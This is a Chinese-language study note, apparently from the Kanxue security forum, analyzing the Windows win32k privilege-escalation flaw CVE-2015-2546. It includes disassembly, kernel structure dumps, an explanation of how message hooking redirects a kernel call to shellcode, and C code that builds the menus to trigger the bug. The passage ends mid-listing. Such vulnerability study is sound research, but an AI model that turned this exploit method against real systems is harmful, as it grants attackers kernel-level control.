---
title: CVE-2015-2546提权漏洞学习笔记
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458494923&idx=1&sn=1d157ebbe377348cad89a8367a9d4da4&chksm=b18e974186f91e5776bbaf02530f84af44781a7e26187dd4f8907cec6cab7ec2df8f5ee2f4ee&scene=58&subscene=0#rd
source: 看雪学院
date: 2023-02-20
fetch_date: 2025-10-04T07:33:32.228612
---

# CVE-2015-2546提权漏洞学习笔记

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8H927eQIguHibTpiaQzZ1q3LstuWiamHzp2SuYuQ6OZ78xFfR4dDmfELKfkrPfyllKnEXOCPiaTxKOUew/0?wx_fmt=jpeg)

# CVE-2015-2546提权漏洞学习笔记

1900

看雪学苑

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8H927eQIguHibTpiaQzZ1q3LsLAUh1Qiaub6IzOQDUu9s25O6nhPoScXNgXAHaHevSKIuOEgyJibfjLKg/640?wx_fmt=jpeg)

本文为看雪论坛优秀文章

看雪论坛作者ID：1900

#

```
一

前言
```

##

## **1.漏洞描述**

和CVE-2014-4113一样，这个漏洞也是因为调用xxxSendMessage函数的时候，没有对第一个参数进行合法性验证。用户可以通过一定的方法修改第一个参数的值，导致可以通过xxxSendMessageTimeout中的以下代码实现提权：

```
.text:BF8B94E8 loc_BF8B94E8:                           .text:BF8B94E8                 push    [ebp+Src].text:BF8B94EB                 push    dword ptr [ebp+UnicodeString].text:BF8B94EE                 push    ebx.text:BF8B94EF                 push    esi.text:BF8B94F0                 call    dword ptr [esi+60h]
```

与CVE-2014-4113不同的是，这次的漏洞在xxxHandleMenuMessage中调用的xxxMNMouseMove函数中。

##

## **2.实验环境**

* 操作系统：Win7 X86 sp1 专业版
* 编译器：Visual Studio 2017
* 调试器：IDA Pro，WinDbg

#

#

```
二

漏洞分析
```

要理解这个漏洞，需要对两个结构体有所了解，第一个是tagMENUWND，该结构体定义如下：

```
kd> dt tagMENUWNDwin32k!tagMENUWND   +0x000 head             : _THRDESKHEAD   +0x014 state            : Uint4B   +0x018 state2           : Uint4B   +0x01c ExStyle          : Uint4B   +0x020 style            : Uint4B   +0x024 hModule          : Ptr32 Void   +0x028 hMod16           : Uint2B   +0x02a fnid             : Uint2B   +0x02c spwndNext        : Ptr32 tagWND   +0x030 spwndPrev        : Ptr32 tagWND   +0x034 spwndParent      : Ptr32 tagWND   +0x038 spwndChild       : Ptr32 tagWND   +0x03c spwndOwner       : Ptr32 tagWND   +0x040 rcWindow         : tagRECT   +0x050 rcClient         : tagRECT   +0x060 lpfnWndProc      : Ptr32     long    +0x064 pcls             : Ptr32 tagCLS   +0x068 hrgnUpdate       : Ptr32 HRGN__   +0x06c ppropList        : Ptr32 tagPROPLIST   +0x070 pSBInfo          : Ptr32 tagSBINFO   +0x074 spmenuSys        : Ptr32 tagMENU   +0x078 spmenu           : Ptr32 tagMENU   +0x07c hrgnClip         : Ptr32 HRGN__   +0x080 hrgnNewFrame     : Ptr32 HRGN__   +0x084 strName          : _LARGE_UNICODE_STRING   +0x090 cbwndExtra       : Int4B   +0x094 spwndLastActive  : Ptr32 tagWND   +0x098 hImc             : Ptr32 HIMC__   +0x09c dwUserData       : Uint4B   +0x0a0 pActCtx          : Ptr32 _ACTIVATION_CONTEXT   +0x0a4 pTransform       : Ptr32 _D3DMATRIX   +0x0a8 spwndClipboardListenerNext : Ptr32 tagWND   +0x0ac ExStyle2         : Uint4B   +0x0b0 PopupMenu    : Ptr32 tagPOPUPMENU
```

其中最关键得是最后一个成员，也就是偏移0x0B0处得PopupMenu，该成员是一个tagPOPUPMENU结构体，结构体定义如下：

```
kd> dt tagPOPUPMENUwin32k!tagPOPUPMENU   +0x000 flags      : Uint4B   +0x004 spwndNotify     : Ptr32 tagWND   +0x008 spwndPopupMenu   : Ptr32 tagWND   +0x00c spwndNextPopup   : Ptr32 tagWND   +0x010 spwndPrevPopup   : Ptr32 tagWND   +0x014 spmenu           : Ptr32 tagMENU   +0x018 spmenuAlternate  : Ptr32 tagMENU   +0x01c spwndActivePopup  : Ptr32 tagWND   +0x020 ppopupmenuRoot   : Ptr32 tagPOPUPMENU   +0x024 ppmDelayedFree   : Ptr32 tagPOPUPMENU   +0x028 posSelectedItem  : Uint4B   +0x02c posDropped       : Uint4B
```

在xxxMNMouseMove函数中，首先会调用xxxMNFindWindowFromPoint函数获取返回值，而该函数的返回值是通过xxxSendMessage发送0x1EB的消息得到的。因此，对0x1EB的消息进行挂钩就可以修改此处的返回值，这里的返回值需要修改成tagMenuWnd(原因在下面)。为了触发漏洞，此处的返回值就不能是-1或-5，这样才能绕过2，3的验证，而由于4的验证，返回值还需要是一个合法的窗口的值，因为在IsWindowBeingDestroyed函数中，会对窗口的属性进行检查。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8H4yqSxOmHFDodVVkgicYkhSQsoO44mIKSCwJBT2R2HFHHF4iaNqHBrEv66bQyy9Ydvqc2KBfAS7qUg/640?wx_fmt=png)

接下来，函数会将tagMenuWnd中偏移0xB0处保存的结构为tagPOPUPMENU的pTagMenuWnd取出，将它作为第一个参数调用xxxMNHideNextHierachy。可是在此之前，函数通过xxxSendMessage发送了两次消息，而且这两个函数的参数都是pTagMenuWnd。那么，用户就可以在通过挂钩的方式，在调用xxxMNHideNextHierachy函数之前对tagMenuWnd中的数据进行更改，也就是更改偏移0xB0处的pTagPopupMenu。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8H4yqSxOmHFDodVVkgicYkhScXEAq4grKQ461orJwyIKRR7UZKBWdAhkjMADAlJw3N1MjnmDSRxLaA/640?wx_fmt=png)

这里IDA反编译的结果出了问题，两个xxxSendMessage函数发送的消息应当分别是0x1E5和0x1F0，因为它们的汇编代码分别如下：

```
.text:BF939517 loc_BF939517:                           .text:BF939517                 xor     edi, edi.text:BF939519                 push    edi            .text:BF93951A                 push    dword ptr [ebp+UnicodeString] .text:BF93951D                 push    1E5h            .text:BF939522                 push    esi             .text:BF939523                 call    _xxxSendMessage@16 ; xxxSendMessage(x,x,x,x).text:BF939528                 test    al, 10h.text:BF93952A                 jz      short loc_BF939583.text:BF93952C                 test    al, 3.text:BF93952E                 jnz     short loc_BF939583.text:BF939530                 push    edi             .text:BF939531                 push    edi             .text:BF939532                 push    1F0h            .text:BF939537                 push    esi           .text:BF939538                 call    _xxxSendMessage@16 ; xxxSendMessage(x,x,x,x).text:BF93953D                 test    eax, eax.text:BF93953F                 jnz     short loc_BF939583.text:BF939541                 push    ebx.text:BF939542                 call    _xxxMNHideNextHierarchy@4 .text:BF939547                 jmp     short loc_BF939583
```

在xxxMNHideNextHierarchy函数中，会将pTagPopupMenu偏移0x0C的spwndNextPopup作为第一个参数调用xxxSendMessage函数。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8H4yqSxOmHFDodVVkgicYkhS1bQxrVpkB7TNnIIdep3Etwyt46vqzpTb1dMtDtOQjpr3GibMMUhcqng/640?wx_fmt=png)

虽然这里第八第九行代码验证了spwndNextPopup是否为0，但是，函数没有对pTagPopupmenu进行验证。因此，只要修改掉spwndNextPopup，让它不为0。

最终将导致代码xxSendMessageTimeout中的call dword ptr [esi + 0x60]就变成call dword ptr [spwndNextPopup + 0x60]，此时只要在相应的位置放入ShellCode函数地址，就可以实现提权。

#

#

```
三

漏洞利用
```

和CVE-2014-4113相同的是，该漏洞也需要通过TrackPopupMenu函数来触发，所以也需要以下的代码来创建相应的窗口。

```
HWND hWnd = NULL;WNDCLASS wc = { 0 };HMENU hMenu1 = NULL, hMenu2 = NULL;MENUITEMINFO Item1 = { 0 }, Item2 = { 0 }; memset(&wc, 0, sizeof(wc)); wc.hInstance = GetModuleHandle(NULL);wc.lpfnWndProc = WndProc_2015_2546;wc.lpszClassName = "1900"; if (!RegisterClassA(&wc)){    ShowError("RegisterClassA", GetLastError());    bRet = FALSE;    goto exit;} hWnd = CreateWindowA(wc.lpszClassName,               "",               WS_OVERLAPPEDWINDOW | WS_VISIBLE,               0,               0,               640,               480,               NULL,               NULL,               wc.hInstance,               NULL);if (!hWnd){    ShowError("CreateWindowEx", GetLastError());    bRet = FALSE;    goto exit;} hMenu1 = CreatePopupMenu();if (!hMenu1){    ShowError("CreatePopupMenu", GetLastError());    bRet = FALSE;    goto exit;} memset(&Item1, 0, sizeof(Item1));memset(&Item2, 0, sizeof(Item2)); Item1.cbSize = sizeof(Item1);Item1.fMask = MIIM_STRING;if (!InsertMenuItemA(hMenu1, 0, TRUE, &Item1)){    ShowError("InsertMenuItemA 1", GetLastError());    bRet = FALSE;    goto exit;} hMenu2 = CreatePopupMenu();if (!hMenu2){    ShowError("CreatePopupMenu 2", GetLastError());    bRet = FALSE;    goto exit;} Item2.fMask = MIIM_STRING | MIIM_SUBMENU;Item2.dwTypeData = "";Item2.cch = 1;Item2.hSubMenu = hMenu1;Item2.cbSize = sizeof(Item2); if (!InsertMenuItemA(hMenu2, 0, TRUE, &Item2)){    ShowError("InsertMenuItemA 2", GetLastError());    bRet = FALSE;    goto exit;} // 触发漏洞if (!TrackPopupMenu(hMenu2, 0, 0, 0, 0, hWnd, NULL)){    ShowError("TrackPopupMenu", GetLastError());    bRet = FALSE;    goto exit;}
```

不同的地方在于此时触发漏洞的位置是不同的，以下是部分代码：

```
int __stdcall xxxHandleMenuMessages(int a1, int a2, WCHAR UnicodeString){  uMsg = *(_DWORD *)(a1 + 4);  if ( uMsg > 0x104 )  {    if ( uMsg > 0x202 )    {    }    if ( uMsg == 0x202 )      goto LABEL_80;    v20 = uMsg - 0x105;         // uMsg - 0x105    if ( v20 )    {      v21 = v20 - 1;          // uMsg - 0x1                      if ( v21 )      {        v22 = v21 - 0x12;       // uMsg - 0x12        if ( !v22 )          return 1;        v23 = v22 - 0xE8;       // uMsg - 0xE8        if ( v23 )                  {          if ( v23 == 1 )          {               // CVE-2014-4113漏洞触发点            iRet = (_DWORD *)xxxMNFindWindo...